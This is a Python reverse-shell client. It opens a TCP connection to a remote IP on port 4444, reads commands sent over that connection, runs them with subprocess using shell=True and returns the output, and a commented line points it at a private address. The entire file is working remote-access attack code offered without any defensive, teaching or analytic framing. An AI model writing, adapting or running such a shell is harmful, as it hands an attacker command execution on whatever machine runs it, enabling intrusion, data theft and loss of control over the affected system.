import socket
import subprocess
import sys

def run_command(command: str):
    c = subprocess.run(command.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    if c.returncode == 2:
        return b'[-] Command Error.'
    return c.stdout

def client(ip: str, port: int = 4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    
    # recive the first massage
    command = s.recv(2048).decode()
    while True:
        try:
            command = s.recv(2048).decode()
            if command.lower() == 'exit':
                s.close()
                sys.exit(-1)
            
            elif command == None:
                print(f'[-] Executing command error')
                sys.exit(-1)
            
            else:
                s.send(run_command(command))

        except KeyboardInterrupt:
            print(f'[-] Exiting...')
            sys.exit(-1)

# client('10.204.163.247', 4444)